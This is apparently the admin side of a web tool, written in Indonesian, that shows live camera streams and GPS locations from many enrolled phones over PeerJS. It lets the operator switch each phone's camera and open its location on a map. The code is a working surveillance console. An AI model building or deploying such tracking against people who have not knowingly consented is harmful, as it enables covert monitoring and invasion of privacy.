<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Multi-HP - Live Kamera & Lokasi</title>
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
    body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }
    .container { max-width: 1380px; margin: 0 auto; }
    .topbar {
      display: flex; justify-content: space-between; align-items: center;
      flex-wrap: wrap; gap: 12px; padding-bottom: 16px; margin-bottom: 18px;
      border-bottom: 1px solid #1E293B;
    }
    .topbar h1 { font-size: 20px; font-weight: 700; }
    .sub { font-size: 12px; color: #94A3B8; margin-top: 4px; }
    .controls { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
    button {
      border: none; border-radius: 8px; padding: 9px 13px;
      font-size: 12px; font-weight: 600; cursor: pointer; color: #FFFFFF;
    }
    .btn-blue { background: #118EE9; }
    .btn-blue:hover { background: #0D7CD0; }
    .btn-indigo { background: #4F46E5; }
    .btn-indigo:hover { background: #4338CA; }
    .btn-slate { background: #334155; }
    .btn-slate:hover { background: #475569; }
    .btn-sm { padding: 6px 10px; font-size: 11px; border-radius: 6px; }

    .grid-devices {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(290px, 1fr));
      gap: 14px;
    }
    .device-card {
      background: #111827;
      border: 1px solid #1F2937;
      border-radius: 14px;
      overflow: hidden;
      display: flex;
      flex-direction: column;
    }
    .video-wrap {
      position: relative;
      width: 100%;
      aspect-ratio: 4 / 3;
      background: #020617;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .video-wrap video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .video-placeholder {
      font-size: 12px;
      color: #64748B;
      text-align: center;
      padding: 12px;
    }
    .chip-row {
      position: absolute;
      top: 8px; left: 8px; right: 8px;
      display: flex; justify-content: space-between; gap: 6px;
      pointer-events: none;
    }
    .chip {
      background: rgba(15, 23, 42, 0.85);
      border: 1px solid rgba(148, 163, 184, 0.25);
      color: #F8FAFC;
      font-size: 10px;
      font-weight: 700;
      padding: 3px 8px;
      border-radius: 999px;
    }
    .chip.live { background: rgba(22, 163, 74, 0.92); border-color: transparent; }
    .chip.off { background: rgba(185, 28, 28, 0.9); border-color: transparent; }

    .card-body { padding: 12px; display: flex; flex-direction: column; gap: 8px; font-size: 12px; }
    .device-id { font-weight: 700; color: #E2E8F0; font-size: 13px; }
    .meta-line { color: #94A3B8; font-size: 11px; line-height: 1.4; }
    .card-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 4px; }
    .map-link {
      color: #38BDF8; font-size: 11px; font-weight: 600;
      text-decoration: none; margin-left: auto; align-self: center;
    }
    .empty-box {
      background: #111827; border: 1px solid #1F2937; border-radius: 14px;
      padding: 36px 20px; text-align: center; color: #64748B; font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="topbar">
      <div>
        <h1>Panel Pantau Multi-HP (<span id="onlineCount">0</span> Aktif)</h1>
        <div class="sub" id="lobbyStatus">Menghubungkan ke Lobby Admin...</div>
      </div>
      <div class="controls">
        <button class="btn-blue" onclick="connectAllDevices()">▶ Hubungkan Semua HP</button>
        <button class="btn-indigo" onclick="switchAllCameras('user')">🤳 Semua Depan</button>
        <button class="btn-indigo" onclick="switchAllCameras('environment')">📷 Semua Belakang</button>
        <button class="btn-slate" onclick="pingAllDevices()">🔄 Refresh Status</button>
      </div>
    </div>

    <div id="devicesGrid" class="grid-devices">
      <div id="emptyBox" class="empty-box" style="grid-column:1/-1;">
        Menunggu perangkat member membuka halaman/APK dan mengizinkan lokasi serta kamera...
      </div>
    </div>
  </div>

  <script>
    const ADMIN_LOBBY_ID = "jirun-admin-lobby-9988";
    const STALE_AFTER_MS = 10000;

    let peer = null;
    const devices = {};

    function initAdminPeer() {
      if (peer) return;
      peer = new Peer(ADMIN_LOBBY_ID);

      peer.on("open", () => {
        document.getElementById("lobbyStatus").textContent = `Lobby Aktif (${ADMIN_LOBBY_ID}) • Menunggu HP terhubung`;
      });

      peer.on("connection", (conn) => {
        const id = conn.peer;
        const entry = ensureDeviceEntry(id);
        entry.conn = conn;
        entry.connected = true;
        entry.updatedAt = Date.now();
        syncDeviceCard(id);

        conn.on("open", () => {
          conn.send({ type: "REQUEST_STREAM" });
        });

        conn.on("data", (msg) => {
          if (!msg) return;
          if (msg.type === "HP_PRESENCE") {
            entry.facing = msg.facing || entry.facing || "Depan";
            entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
            entry.location = msg.location || entry.location;
            entry.device = msg.device || entry.device;
            entry.connected = true;
            entry.updatedAt = Date.now();

            if (!entry.call && peer && !peer.destroyed) {
              requestStreamFromDevice(id);
            }
            syncDeviceCard(id);
          }
        });

        conn.on("close", () => {
          if (devices[id]) {
            devices[id].conn = null;
            devices[id].connected = false;
            devices[id].stream = null;
            attachStreamToCard(id, null);
            syncDeviceCard(id);
          }
        });
      });

      peer.on("call", (call) => {
        const id = call.peer;
        const entry = ensureDeviceEntry(id);
        entry.call = call;
        call.answer();
        call.on("stream", (remoteStream) => {
          entry.stream = remoteStream;
          entry.connected = true;
          entry.updatedAt = Date.now();
          attachStreamToCard(id, remoteStream);
          syncDeviceCard(id);
        });
        call.on("close", () => {
          entry.call = null;
          entry.stream = null;
          attachStreamToCard(id, null);
          syncDeviceCard(id);
        });
      });

      peer.on("disconnected", () => {
        if (peer && !peer.destroyed) peer.reconnect();
      });
    }

    function ensureDeviceEntry(id) {
      if (!devices[id]) {
        devices[id] = {
          peerId: id,
          facing: "Depan",
          cameraOn: true,
          location: null,
          device: "",
          updatedAt: Date.now(),
          connected: true,
          conn: null,
          call: null,
          stream: null
        };
      }
      return devices[id];
    }

    function requestStreamFromDevice(id) {
      const entry = devices[id];
      if (!entry || !peer || peer.destroyed) return;
      if (entry.conn && entry.conn.open) {
        entry.conn.send({ type: "REQUEST_STREAM" });
      }
    }

    function connectAllDevices() {
      for (const id of Object.keys(devices)) {
        requestStreamFromDevice(id);
      }
    }

    function switchDeviceCamera(id, facing) {
      const entry = devices[id];
      if (entry && entry.conn && entry.conn.open) {
        entry.conn.send({ type: "SWITCH_CAM", facing });
      }
    }

    function switchAllCameras(facing) {
      for (const id of Object.keys(devices)) {
        switchDeviceCamera(id, facing);
      }
    }

    function pingAllDevices() {
      for (const entry of Object.values(devices)) {
        if (entry.conn && entry.conn.open) {
          entry.conn.send({ type: "PING" });
        }
      }
      syncAllCards();
    }

    function attachStreamToCard(id, stream) {
      const vid = document.getElementById(`vid_${id}`);
      const ph = document.getElementById(`ph_${id}`);
      if (!vid || !ph) return;

      if (stream) {
        if (vid.srcObject !== stream) {
          vid.srcObject = stream;
        }
        vid.style.display = "block";
        ph.style.display = "none";
        if (vid.paused) {
          vid.play().catch(() => {});
        }
      } else {
        vid.srcObject = null;
        vid.style.display = "none";
        ph.style.display = "block";
      }
    }

    function escapeHtml(str) {
      if (!str) return "";
      return String(str).replace(/[&<>"']/g, (ch) => ({
        "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "'": "&#39;"
      }[ch]));
    }

    function createCardElement(d) {
      const safeId = escapeHtml(d.peerId);
      const card = document.createElement("div");
      card.className = "device-card";
      card.id = `card_${d.peerId}`;
      card.innerHTML = `
        <div class="video-wrap">
          <div class="chip-row">
            <span class="chip" id="status_${safeId}">Menunggu</span>
            <span class="chip">${escapeHtml(d.peerId.slice(-6))}</span>
          </div>
          <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
          <div id="ph_${safeId}" class="video-placeholder">
            Kamera tidak aktif / menunggu stream...
          </div>
        </div>
        <div class="card-body">
          <div class="device-id">${safeId}</div>
          <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat akurat...</div>
          <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
          <div class="card-actions" id="act_${safeId}">
            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
            <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'environment')">Belakang</button>
            <button class="btn-blue btn-sm" onclick="requestStreamFromDevice('${safeId}')">Stream</button>
          </div>
        </div>
      `;
      return card;
    }

    function syncDeviceCard(id) {
      const d = devices[id];
      if (!d) return;

      const emptyBox = document.getElementById("emptyBox");
      if (emptyBox) emptyBox.remove();

      const grid = document.getElementById("devicesGrid");
      let card = document.getElementById(`card_${id}`);
      if (!card) {
        card = createCardElement(d);
        grid.appendChild(card);
      }

      const ageMs = Date.now() - (d.updatedAt || 0);
      const ageSec = Math.max(0, Math.round(ageMs / 1000));
      const isOnline = Boolean(d.connected) && ageMs <= STALE_AFTER_MS;
      const hasLiveStream = Boolean(d.stream && d.stream.active);

      const statusChip = document.getElementById(`status_${id}`);
      if (statusChip) {
        if (!isOnline) {
          statusChip.textContent = `MATI / OFFLINE (${ageSec}d)`;
          statusChip.className = "chip off";
        } else if (hasLiveStream) {
          statusChip.textContent = `LIVE • ${d.facing || "Depan"}`;
          statusChip.className = "chip live";
        } else {
          statusChip.textContent = `TERHUBUNG • ${d.facing || "Depan"}`;
          statusChip.className = "chip";
        }
      }

      const ph = document.getElementById(`ph_${id}`);
      if (ph && !hasLiveStream) {
        ph.textContent = !isOnline
          ? "Koneksi terputus (aplikasi/halaman ditutup atau hilang sinyal)"
          : "Menghubungkan stream kamera...";
      }

      const loc = d.location;
      const hasCoords = loc && typeof loc.lat === "number" && typeof loc.lng === "number";
      const locEl = document.getElementById(`loc_${id}`);
      if (locEl) {
        locEl.textContent = hasCoords
          ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"})`
          : "📍 Menunggu koordinat akurat...";
      }

      const devEl = document.getElementById(`dev_${id}`);
      if (devEl) {
        devEl.textContent = `📱 ${d.device || "Perangkat"}`;
      }

      const actEl = document.getElementById(`act_${id}`);
      if (actEl) {
        let mapLink = actEl.querySelector(".map-link");
        if (hasCoords) {
          const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
          if (!mapLink) {
            mapLink = document.createElement("a");
            mapLink.className = "map-link";
            mapLink.target = "_blank";
            mapLink.rel = "noopener noreferrer";
            mapLink.textContent = "Maps ↗";
            actEl.appendChild(mapLink);
          }
          mapLink.href = mapUrl;
        } else if (mapLink) {
          mapLink.remove();
        }
      }

      if (hasLiveStream) {
        attachStreamToCard(id, d.stream);
      } else {
        attachStreamToCard(id, null);
      }

      const activeCount = Object.values(devices).filter(
        (item) => item.connected && (Date.now() - (item.updatedAt || 0)) <= STALE_AFTER_MS
      ).length;
      document.getElementById("onlineCount").textContent = activeCount;
    }

    function syncAllCards() {
      for (const id of Object.keys(devices)) {
        syncDeviceCard(id);
      }
    }

    window.addEventListener("DOMContentLoaded", () => {
      initAdminPeer();
      setInterval(syncAllCards, 2000);
    });
  </script>
</body>
</html>
